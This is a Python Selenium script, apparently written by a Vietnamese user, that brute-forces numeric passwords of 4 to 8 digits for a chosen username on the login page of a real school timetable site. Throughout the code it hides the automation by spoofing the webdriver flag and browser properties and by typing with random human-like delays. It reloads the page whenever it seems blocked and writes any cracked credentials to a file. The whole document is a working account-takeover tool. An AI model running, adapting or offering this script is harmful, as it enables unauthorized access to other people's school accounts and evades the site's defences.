from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.options import Options
import time
import random
import os

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def setup_driver():
    options = Options()
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--start-maximized")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)
    
    service = Service(ChromeDriverManager().install())
    driver = webdriver.Chrome(service=service, options=options)
    
   
    driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
        "source": """
            Object.defineProperty(navigator, 'webdriver', {get: () => false});
            window.navigator.chrome = {runtime: {},};
            Object.defineProperty(navigator, 'languages', {get: () => ['vi-VN', 'vi', 'en']});
            Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
        """
    })
    return driver


def gen_password(length):
    for i in range(10**length):
        yield f"{i:0{length}d}"


clear()
print("="*65)
print("    VIETSCHOOL đoán mò  ")
print("    -_-        ")
print("="*65)

username = input("\n[+] Nhập Tên đăng nhập (ví dụ: ai biết đang mò mà tự đoán ik): ").strip()
if not username:
    print("[-] Chưa nhập tài khoản!")
    exit()

while True:
    try:
        length = int(input("[+] Nhập số ký tự mật khẩu (thường là nhiêu ai biết đâu đoán nữa ik): "))
        if 4 <= length <= 8:
            break
        else:
            print("[-_-] Chỉ hỗ trợ 4-8 ký tự thôi ông ơi !")
    except:
        print("[-_-] Nhập số đi ơ cái thằng này, ơ sai rồi nhập lại đi!")

print(f"\n[😁] Bắt đầu mò {username} - mật khẩu {length} số")
print("[😊] Đang mở Chrome... (lần đầu hơi lâu, đợi tí nhen cu)")

driver = setup_driver()
driver.get("https://thoikhoabieu.vn/")
time.sleep(8)

found = False
tried = 0

try:
    for password in gen_password(length):
        tried += 1
        print(f"\r[{tried:,}] Đang thử → {password}     ", end="", flush=True)

        try:
           
            user_box = driver.find_element(By.ID, "txtUserName")
            user_box.clear()
            user_box.send_keys(username)
            time.sleep(0.8)

            
            pass_box = driver.find_element(By.ID, "txtPassword")
            pass_box.clear()
            for char in password:
                pass_box.send_keys(char)
                time.sleep(random.uniform(0.1, 0.25))

            time.sleep(random.uniform(1.5, 3.0))

           
            driver.find_element(By.ID, "btnLogin").click()
            time.sleep(5)

            
            if any(x in driver.current_url for x in ["/Home/Dashboard", "/Student", "thoi-khoa-bieu"]):
                print(f"\n\n\033[92m[😁] RA PASS RỒI NGON THÍ!!! → {username}:{password}\033[0m")
                with open("VIETSCHOOL_CRACKED.txt", "a", encoding="utf-8") as f:
                    f.write(f"{username}:{password}\n")
                found = True
                break

            
            page = driver.page_source.lower()
            if "sai tên đăng nhập hoặc mật khẩu chịu luôn" in page or "không đúng =((" in page:
                pass  
            else:
                print(f"\n[😒] Có thể bị chặn tạm... reload trang...")
                driver.get("https://thoikhoabieu.vn/")
                time.sleep(10)

        except Exception as e:
            print(f"\n[!!!] Lỗi: {e} → reload...")
            driver.get("https://thoikhoabieu.vn/")
            time.sleep(10)

    if not found:
        print(f"\n[-] Dò hết {10**length:,} mật khẩu mà không tìm thấy!")
        print("[-] Có thể mật khẩu không phải số thuần,do ngu hoặc tài khoản sai.")

except KeyboardInterrupt:
    print("\n\n[!] Đã dừng bởi vì tìm đếch ra (Ctrl+C)")

finally:
    print("\n[+] Đang đóng trình duyệt mẹ rồi...")
    driver.quit()
    print("[+] Hoàn tất!")
